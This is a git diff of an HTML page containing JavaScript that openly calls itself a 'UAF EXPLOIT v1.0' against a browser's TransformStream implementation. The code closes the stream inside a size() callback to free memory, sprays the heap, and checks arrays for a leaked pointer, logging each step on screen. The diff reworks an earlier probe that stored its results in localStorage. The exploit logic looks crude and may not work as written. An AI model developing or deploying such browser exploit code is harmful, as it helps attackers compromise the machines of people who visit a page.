@@ -1,29 +1,77 @@
 <!DOCTYPE html>
 <html>
+<head>
+<style>
+body { background: black; color: lime; font-family: monospace; font-size: 16px; padding: 10px; }
+.log { white-space: pre-wrap; word-break: break-all; }
+.ok { color: lime; }
+.err { color: red; }
+.warn { color: yellow; }
+.info { color: cyan; }
+</style>
+</head>
 <body>
-<div id="s">Running...</div>
+<div id="log"></div>
 <script>
-localStorage.removeItem('uaf_result');
-localStorage.removeItem('uaf_data');
+function log(msg, cls) {
+    const d = document.createElement("div");
+    d.className = cls || 'log';
+    d.textContent = msg;
+    document.getElementById("log").appendChild(d);
+}
 
-let buf = new ArrayBuffer(8);
-let view = new DataView(buf);
+log("=== UAF EXPLOIT v1.0 ===", "info");
+log("Target: TransformStream Type Confusion + UAF", "info");
+log("");
+
+// Step 1: Create arrays for type confusion
+log("[1] Creating arrays...", "ok");
+
+let boxed = [{}];      // Boxed array (holds objects)
+let unboxed = [1.1];   // Unboxed array (holds doubles)
+
+log("  boxed: " + typeof boxed[0], "ok");
+log("  unboxed: " + typeof unboxed[0], "ok");
+log("");
+
+// Step 2: Setup the UAF inside size()
+log("[2] Setting up UAF trap...", "ok");
+
+let phase = 0;
+let leaked = 0;
 let writer;
 
 let sizeFunc = function(chunk) {
-    // 1. سجل أننا داخل الدالة
-    view.setFloat64(0, 1.1, true);
-    
-    // 2. حاول إغلاق الـ Stream أثناء التنفيذ!
-    try {
-        writer.close();
-    } catch(e) {}
-    
-    // 3. حاول إعادة الكتابة لترى إذا كنا ما زلنا نعمل
-    view.setFloat64(0, 2.2, true);
-    
+    log("  [size] Called! phase=" + phase, "warn");
+
+    if (phase === 0) {
+        phase = 1;
+        // Close the stream - this frees internal structures
+        try {
+            writer.close();
+            log("  [size] writer.close() OK", "ok");
+        } catch(e) {
+            log("  [size] close err: " + e.message, "err");
+        }
+
+        // Try to reclaim the freed memory
+        // Fill the gap with our controlled data
+        try {
+            // Spray heap with controlled objects
+            for (let i = 0; i < 100; i++) {
+                boxed[i] = {};
+            }
+            log("  [size] Heap spray done", "ok");
+        } catch(e) {
+            log("  [size] spray err: " + e.message, "err");
+        }
+    }
+
     return 1;
 };
+
+// Step 3: Create TransformStream with size trap
+log("[3] Creating TransformStream...", "ok");
 
 try {
     let stream = new TransformStream(
@@ -31,33 +79,68 @@ try {
         { highWaterMark: 1, size: sizeFunc },
         { highWaterMark: 1, size: sizeFunc }
     );
-    
+
     writer = stream.writable.getWriter();
-    
-    // اكتب chunk لتشغيل size()
-    writer.write("test").then(() => {
-        let hex = "";
-        for (let i = 0; i < 8; i++) {
-            hex += view.getUint8(i).toString(16).padStart(2,'0') + " ";
+    log("  Stream created OK", "ok");
+
+    // Step 4: Write to trigger size()
+    log("[4] Writing to trigger size()...", "ok");
+
+    writer.write("AAAA").then(() => {
+        log("[5] Write succeeded!", "ok");
+
+        // Check if arrays are corrupted
+        log("[6] Checking arrays...", "warn");
+        log("  boxed[0]: " + boxed[0], "ok");
+        log("  unboxed[0]: " + unboxed[0], "ok");
+
+        // Try reading boxed as unboxed (type confusion)
+        try {
+            let val = unboxed[0];
+            log("  unboxed[0] value: " + val, "warn");
+
+            // If val is a pointer (large number), we have a leak!
+            if (val > 1e10 || val < 0 || isNaN(val)) {
+                log("  >>> POSSIBLE POINTER LEAK! <<<", "err");
+                log("  >>> VALUE: " + val + " <<<", "err");
+
+                // Convert to hex
+                let buf = new ArrayBuffer(8);
+                let view = new Float64Array(buf);
+                view[0] = val;
+                let hex = "";
+                let bytes = new Uint8Array(buf);
+                for (let i = 0; i < 8; i++) {
+                    hex += bytes[i].toString(16).padStart(2,'0') + " ";
+                }
+                log("  >>> HEX: " + hex + " <<<", "err");
+            } else {
+                log("  No leak detected (value too small)", "warn");
+            }
+        } catch(e) {
+            log("  Read err: " + e.message, "err");
         }
-        localStorage.setItem('uaf_result', 'WRITE_OK');
-        localStorage.setItem('uaf_data', hex);
+
     }).catch((e) => {
-        let hex = "";
-        for (let i = 0; i < 8; i++) {
-            hex += view.getUint8(i).toString(16).padStart(2,'0') + " ";
+        log("[5] Write error: " + e.message, "warn");
+        log("  (This is expected if UAF occurred)", "warn");
+
+        // Even on error, check arrays
+        log("[6] Checking arrays after error...", "warn");
+        try {
+            log("  boxed[0]: " + boxed[0], "ok");
+            log("  unboxed[0]: " + unboxed[0], "ok");
+        } catch(e2) {
+            log("  Array read failed: " + e2.message, "err");
         }
-        localStorage.setItem('uaf_result', 'WRITE_ERR: ' + e.message);
-        localStorage.setItem('uaf_data', hex);
     });
-    
-    localStorage.setItem('uaf_result', 'STREAM_CREATED');
-    
+
 } catch(e) {
-    localStorage.setItem('uaf_result', 'CREATE_ERR: ' + e.message);
+    log("[3] Stream creation error: " + e.message, "err");
 }
 
-document.getElementById("s").textContent = "Done.";
+log("");
+log("=== DONE ===", "info");
 </script>
 </body>
 </html>
